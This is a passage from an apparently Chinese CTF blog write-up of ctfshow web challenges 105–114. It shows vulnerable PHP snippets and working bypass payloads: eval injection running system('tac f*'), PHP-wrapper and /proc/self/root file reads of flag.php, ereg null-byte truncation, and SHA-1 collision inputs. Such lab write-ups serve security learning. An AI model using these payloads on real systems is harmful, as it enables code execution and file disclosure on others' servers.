class="line">error=tmp</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404180119820.png" alt="image-20220404180119820"></p><p>当然也可以利用suces输出那么就需要$suces的只是$flag,接着绕过post的$flag不等于$flag.也就是说post的flag要等于$flag的值,我们不知道$flag的值怎么实现,可以利用post中foreach循环中的赋值将post的flag的值赋值为空</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">suces=flag -&gt; $suces = $flag</span><br><span class="line">POST</span><br><span class="line">flag=      -&gt; $flag = NULL 正好if中的也flag=NULL$flag=NULL刚好绕过die($flag)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?suces=flag</span><br><span class="line">POST</span><br><span class="line">flag=</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404181012634.png" alt="image-20220404181012634"></p><h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: atao</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-28 22:38:27</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2[]=1</span><br><span class="line">POST</span><br><span class="line">v1[]=a</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404181358393.png" alt="image-20220404181358393"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=aaroZmOk</span><br><span class="line">POST</span><br><span class="line">v1=aaK1STfY</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404181433045.png" alt="image-20220404181433045"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br><span class="line">POST</span><br><span class="line">v1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404181516803.png" alt="image-20220404181516803"></p><h1 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-28 23:24:14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> parse_str() 函数</span><br><span class="line"> parse_str() 函数把查询字符串解析到变量中。</span><br><span class="line"></span><br><span class="line">注释：如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</span><br><span class="line"></span><br><span class="line">注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</span><br></pre></td></tr></table></figure><p>那么如果给v3传一个1的话就需要让数组v2中的flag的值为1的MD5值,所以v1&#x3D;flag&#x3D; c4ca4238a0b923820dcc509a6f75849b</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v3=1</span><br><span class="line">POST</span><br><span class="line">v1=flag=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404183227983.png" alt="image-20220404183227983"></p><h1 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-28 23:53:55</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">error</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、ereg()用途</span><br><span class="line"></span><br><span class="line">ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</span><br><span class="line"></span><br><span class="line">可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</span><br><span class="line">2、题中ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母</span><br><span class="line">3、strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line">4、ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</span><br><span class="line">5、ereg()只能处理字符串的，遇到数组做参数返回NULL，判断用的是 === ，要求类型也相同，而NULL跟FALSE类型是不同的,strpos()的参数同样不能为数组，否则返回NULL，而判断用的是 !== ，所以这里的条件成立，也能得到flag</span><br><span class="line"></span><br><span class="line">strrev() 函数反转字符串。</span><br></pre></td></tr></table></figure><p>0x36d  是 877    a%00778 然后翻转87700%a截取整数得到877</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure><p>这里的%00之前好像必须要有字符才可以截断</p><h1 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-29 22:02:34</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这两个正则表达式至少要匹配到一个字母的字符串,那么我们就找一个php的内置类并且可以直接echo输出就好了啊.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception</span><br><span class="line">ReflectionClass</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=a</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&#x27;nl *&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408112052709.png" alt="image-20220408112052709"></p><h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-29 22:49:10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>FilesystemIterator类的使用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;.&#x27;</span>); <span class="comment">#创建一个FilesystemIterator对象并传入当前目录的文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">valid</span>())&#123;<span class="comment">#判断是否到底</span></span><br><span class="line">    <span class="comment">#echo $file-&gt;getFilename().&quot;\n&quot;;#输出文件或者文件夹</span></span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">next</span>();<span class="comment">#指针指向下一位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408112848409.png" alt="image-20220408112848409"></p><p>所以我们需要在得到一个点或者路径就可以查看当前目录下(.)的文件,得到一个查看根目录(&#x2F;)的文件..php中的getcwd()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="comment">#D:\Download</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408113433499.png" alt="image-20220408113433499"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408113447782.png" alt="image-20220408113447782"></p><h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-30 02:41:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);<span class="comment">#如果$v2是$GLOBALS,那么$xxx就是$GLOBALS</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>php超全局变量$GLOBALS的使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GLOBALS 引用全局作用域中可用的全部变量</span><br><span class="line">一个包含了全部变量的全局数组,变量的名字就是数组的键</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">123</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">456</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408201522610.png" alt="image-20220408201522610"></p><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_file — 判断给定文件名是否为一个正常的文件</span><br></pre></td></tr></table></figure><p>我们不能让is_file检测出是文件,并且hightlight_file可以识别为文件,可以使用php伪协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line">?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">?file=compress.zlib://flag.php</span><br><span class="line">?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-30 23:47:52</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure><p>还有这个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的,也就是如果在命令行中输出ls &#x2F;proc&#x2F;self&#x2F;root,其实显示的是根目录下的内容</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408201840652.png" alt="image-20220408201840652"></p><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span 